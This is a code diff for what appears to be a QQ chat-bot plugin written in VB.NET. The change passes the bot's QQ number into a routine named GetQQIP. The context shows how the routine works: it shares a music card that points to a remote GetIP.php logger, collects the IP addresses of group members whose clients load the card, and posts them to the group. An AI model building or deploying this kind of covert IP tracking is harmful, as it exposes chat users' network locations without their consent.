@@ -55,7 +55,7 @@ Module Main
                     Dim urli = url + "GetIP.php?username=" & CLng(DateTime.UtcNow.Subtract(New DateTime(1970, 1, 1)).TotalMilliseconds) & "_" & sMsg.SenderQQ.ToString & "&url=q.qlogo.cn/headimg_dl?dst_uin=" & sMsg.SenderQQ.ToString & "&spec=100"
                     API.ShareMusic(Pinvoke.plugin_key, sMsg.ThisQQ, sMsg.MessageGroupQQ, "谁在窥屏", "正在收集10秒内数据...", "http://q.qlogo.cn/headimg_dl?dst_uin=" & sMsg.ThisQQ.ToString & "&spec=100", urli, urli, 0, 1)
                     System.Threading.Thread.Sleep(10000)
-                    GetQQIP(sMsg.MessageGroupQQ, url)
+                    GetQQIP(sMsg.ThisQQ, sMsg.MessageGroupQQ, url)
                 End If
             End If
         End If
@@ -63,7 +63,7 @@ Module Main
     End Function
 #End Region
 
-    Public Sub GetQQIP(szGruopId As Long, url As String)
+    Public Sub GetQQIP(thisqq As Long, szGruopId As Long, url As String)
         Dim IPList As New List(Of String)
         Dim szOldIP As String = ""
         Dim wClient As New System.Net.WebClient
@@ -80,7 +80,7 @@ Module Main
                     End If
                 End If
             Next
-            API.SendGroupMsg(Pinvoke.plugin_key, RobotQQ, szGruopId, vbNewLine + String.Join(vbNewLine, IPList), False)
+            API.SendGroupMsg(Pinvoke.plugin_key, thisqq, szGruopId, vbNewLine + String.Join(vbNewLine, IPList), False)
             Dim result As String = wClient.DownloadString(url + "DelIP.php?action=DelAll")
         Catch ex As Exception
             Debug.Print(ex.ToString)
